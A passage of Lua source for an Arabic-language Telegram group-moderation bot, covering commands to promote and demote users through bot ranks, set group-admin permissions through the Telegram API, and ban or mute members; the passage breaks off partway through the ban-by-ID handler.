function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:moall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من الادمنيه")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Vipall
if is_moall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and faeder11(msg) then
function raf_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:vpall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه مميز عام𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and faeder11(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:vpall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه مميز عام𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Vipall
if text ==('تنزيل مميز عام') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:vpall:',result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من المميزين𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:vpall:',result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المميزين𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Monsh
if is_vpall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and faeder11(msg) then
function raf_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه منشئ اساسي𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and faeder11(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:monsh:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه منشئ اساسي𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Monsh
if text ==('تنزيل منشئ اساسي') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من الاساسيين𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من الاساسيين𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Monsh2
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and faeder11(msg) then
function raf_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه منشئ𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and faeder11(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:monsh2:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ ↫ تم رفعه منشئ𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Monsh2
if text ==('تنزيل منشئ') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من المنشئين𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المنشئين𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Owner
if is_monsh2(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه مدير𓍢")
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and faeder11(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:owners:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه مدير𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Owner
if text ==('تنزيل مدير') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من المدراء𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المدراء𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Momod
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه ادمن𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and faeder11(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه ادمن𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Momod
if text ==('تنزيل ادمن') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من الادمنيه")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من الادمنيه")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end
--     By Developer Faeder     -- 
-------- Set Vipmem
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:sadd(FAEDER..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم رفعه مميز𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and faeder11(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:sadd(FAEDER..'bot:vipmem:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم رفعه مميز𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
--     By Developer Faeder     -- 
-------- Rem Vipmem
if text ==('تنزيل مميز') and faeder11(msg) then
function prom_reply(extra, result, success)
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","↫ تم تنزيله من المميزين𓍢")
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and faeder11(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_,result.id_)
Send_Options(msg,result.id_,"reply","↫ تم تنزيله من المميزين𓍢")
else 
faederdx(msg.chat_id_, msg.id_, 1, '*↫  المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end end 
--     By Developer Faeder     -- 
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then 
function promote_by_reply(extra, result, success)
if is_leaderid(result.sender_user_id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يمكنك تنزيل Devil  ", 1, 'md')
return false 
end
if faederdx1:sismember(FAEDER..'bot:admins:',result.sender_user_id_) then
sudo3 = 'مطور ثالث ' else sudo3 = '' end
if faederdx1:sismember(FAEDER..'bot:onall:',result.sender_user_id_) then
onall = 'مدير عام ' else onall = '' end
if faederdx1:sismember(FAEDER..'bot:moall:',result.sender_user_id_) then
moall = 'ادمن عام ' else moall = '' end
if faederdx1:sismember(FAEDER..'bot:vpall:',result.sender_user_id_) then
vpall = 'مميز عام ' else vpall = '' end
if faederdx1:sismember(FAEDER..'bot:monsh:'..msg.chat_id_, result.sender_user_id_) then
monsh = 'منشئ اساسي  ' else monsh = '' end
if faederdx1:sismember(FAEDER..'bot:monsh2:'..msg.chat_id_, result.sender_user_id_) then
monsh2 = 'منشئ ' else monsh2 = '' end 
if faederdx1:sismember(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) then
owner = 'مدير ' else owner = '' end
if faederdx1:sismember(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) then
momod = 'ادمن ' else momod = '' end
if faederdx1:sismember(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.sender_user_id_,msg.chat_id_) ~= false then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تنزيله من ↓\n↫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n↫ رتبته الان { عضو فقط }\n", 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, "↫  يتم رفعه باي رتبه سابقا \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
faederdx1:srem(FAEDER..'bot:admins:', result.sender_user_id_) faederdx1:srem(FAEDER..'bot:onall:', result.sender_user_id_) 
faederdx1:srem(FAEDER..'bot:moall:', result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vpall:', result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_) faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
faederdx1:srem(FAEDER..'bot:onall:', result.sender_user_id_) faederdx1:srem(FAEDER..'bot:moall:', result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vpall:', result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) 
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)  faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_) 
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.sender_user_id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.sender_user_id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
--     By Developer Faeder     -- 
if text and text:match("^تنزيل الكل @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if is_leaderid(result.id_) == true then
faederdx(msg.chat_id_, msg.id_, 1, "↫ لا يمكنك تنزيل Devil  ", 1, 'md')
return false 
end
if faederdx1:sismember(FAEDER..'bot:admins:',result.id_) then
sudo3 = 'مطور ثالث ' else sudo3 = '' end
if faederdx1:sismember(FAEDER..'bot:onall:',result.id_) then
onall = 'مدير عام ' else onall = '' end
if faederdx1:sismember(FAEDER..'bot:moall:',result.id_) then
moall = 'ادمن عام ' else moall = '' end
if faederdx1:sismember(FAEDER..'bot:vpall:',result.id_) then
vpall = 'مميز عام ' else vpall = '' end
if faederdx1:sismember(FAEDER..'bot:monsh:'..msg.chat_id_, result.id_) then
monsh = 'منشئ اساسي  ' else monsh = '' end
if faederdx1:sismember(FAEDER..'bot:monsh2:'..msg.chat_id_, result.id_) then
monsh2 = 'منشئ ' else monsh2 = '' end 
if faederdx1:sismember(FAEDER..'bot:owners:'..msg.chat_id_, result.id_) then
owner = 'مدير ' else owner = '' end
if faederdx1:sismember(FAEDER..'bot:momod:'..msg.chat_id_, result.id_) then
momod = 'ادمن ' else momod = '' end
if faederdx1:sismember(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_) then
vipmem = 'مميز' else vipmem = ''
end
if dxdx(result.id_,msg.chat_id_) ~= false then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم تنزيله من ↓\n↫ { "..sudo3..''..onall..''..moall..''..vpall..''..monsh..''..monsh2..''..owner..''..momod..''..vipmem.." } \n↫ رتبته الان { عضو فقط }\n", 1, 'md')
else 
faederdx(msg.chat_id_, msg.id_, 1, "↫  يتم رفعه باي رتبه سابقا \n", 1, 'md')
end 
if fadx(msg.sender_user_id_,msg.chat_id_) == 'botow' then
faederdx1:srem(FAEDER..'bot:admins:', result.id_) faederdx1:srem(FAEDER..'bot:onall:', result.id_)
faederdx1:srem(FAEDER..'bot:moall:', result.id_) faederdx1:srem(FAEDER..'bot:vpall:', result.id_)
faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.id_) faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_)
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'sudo3' then
faederdx1:srem(FAEDER..'bot:onall:', result.id_) faederdx1:srem(FAEDER..'bot:moall:', result.id_)
faederdx1:srem(FAEDER..'bot:vpall:', result.id_) faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_)
faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.id_)
faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.id_) faederdx1:srem(FAEDER..'bot:monsh:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:monsh2:'..msg.chat_id_,result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'monsh2' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.id_)
elseif fadx(msg.sender_user_id_,msg.chat_id_) == 'owner' then
faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_) faederdx1:srem(FAEDER..'bot:vipmem:'..msg.chat_id_, result.id_)
end
Fsend = '↫ المعرف غير صحيح*'
send(msg.chat_id_, msg.id_, 1, Fsend, 1, 'md')
end end
resolve_username(rem[2],remm)
end 
--     By Developer Faeder     -- 
if text:match("^رفع ادمن بلقروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم رفعه ( ادمن بلقروب ) ', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^تنزيل ادمن بلقروب$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
faederdx(msg.chat_id_, msg.id_, 1, '↫ *ادمن القروب* ( ['..faeder_res..'] )\n↫ *تم تنزيله ( عضو ) ', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text:match("^رفع بكل الصلاحيات$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم رفعه ( ادمن بلقروب بكل الصلاحيات )\n↫ صلاحياته الان \n↫ تغيير اسم المجموعه \n↫ حذف الرسائل \n↫ الدعوه بالرابط \n↫ تثبيت الرسائل \n↫ اضافه مشرفين *', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه تغيير الاسم$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم الغاء ( خاصيه تغيير الاسم )\n↫ صلاحياته الان \n↫ حذف الرسائل \n↫ الدعوه بالرابط \n↫ تثبيت الرسائل*', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ and faeder11(msg) then
function promote_by_reply(extra, result, success)
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. result.sender_user_id_)
local faeder_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ⇠ ( ['..faeder_res..'] )\n↫ *تم الغاء ( خاصيه التثبيت )\n↫ صلاحياته الان \n↫ حذف الرسائل \n↫ الدعوه بالرابط *', 1, 'md')
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
--     By Developer Faeder     -- 
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 and faeder11(msg) then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") and faeder11(msg) then
faederdx1:del("faeder:lock:ban"..bot_id..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫  تم تفعيل الحظر ', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
faederdx1:set("faeder:lock:ban"..bot_id..msg.chat_id_,"faeder")
faederdx(msg.chat_id_, msg.id_, 1, '↫  تم تعطيل الحظر ', 1, 'md')
end
if text:match("^تفعيل الكتم$") and faeder11(msg) or text:match("^تفعيل التقييد$") and faeder11(msg) then
faederdx1:del("FAEDER:lock:banmu"..bot_id..msg.chat_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫  تم تفعيل الكتم ', 1, 'md')
end
if text:match("^تعطيل الكتم$") and faeder11(msg) or text:match("^تعطيل التقييد$") and faeder11(msg) then
faederdx1:set("FAEDER:lock:banmu"..bot_id..msg.chat_id_,"faeder")
faederdx(msg.chat_id_, msg.id_, 1, '↫  تم تعطيل الكتم ', 1, 'md')
end end 
--     By Developer Faeder     -- 
if text:match("^حظر$") and msg.reply_to_message_id_ ~= 0 and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
function ban_by_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
local faeder = 'bot:banned:'..msg.chat_id_
if is_momod(result.sender_user_id_, result.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع حظر '..faeder_renk(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if faederdx1:sismember(FAEDER..faeder, result.sender_user_id_) then
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم حظره سابقا𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
else
faederdx1:sadd(FAEDER..faeder, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","\n↫ تم حظره بنجاح𓍢\n")
chat_kick(result.chat_id_, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
--     By Developer Faeder     -- 
if text:match('^حظر @(.*)$') and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local faeder_res = {string.match(text, '^(حظر) @(.*)$')}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
local faeder = 'bot:banned:'..msg.chat_id_
if result.id_ then 
if is_momod(result.id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع حظر '..faeder_renk(result.id_, msg.chat_id_), 1, 'md')
else
if faederdx1:sismember(FAEDER..faeder, result.id_) then
Send_Options(msg,result.id_,"reply","\n↫ تم حظره سابقا𓍢\n")
else
faederdx1:sadd(FAEDER..faeder, result.id_)
Send_Options(msg,result.id_,"reply","\n↫ تم حظره بنجاح𓍢\n")
chat_kick(msg.chat_id_, result.id_)
end end end end
resolve_username(faeder_res[2],ban_by_username)
end
--     By Developer Faeder     -- 
if text:match("^حظر (%d+)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and faeder11(msg) then
local res = {string.match(text, "^(حظر) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and faederdx1:get("faeder:lock:ban"..bot_id..msg.chat_id_) then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع الطرد او الحظر \n↫ لانه معطل من قبل المنشئ . ', 1, 'md')
return "faeder"
end
local user_info_ = faederdx1:get(FAEDER..'user:Name' .. res[2])
local faeder_res = user_info_ if user_info_ then
if is_momod(res[2], msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لا تستطيع حظر '..faeder_renk(res[2], msg.chat_id_), 1, 'md')
else
faederdx1:sadd(FAEDER..'bot:banned:'..msg.chat_id_, res[2])
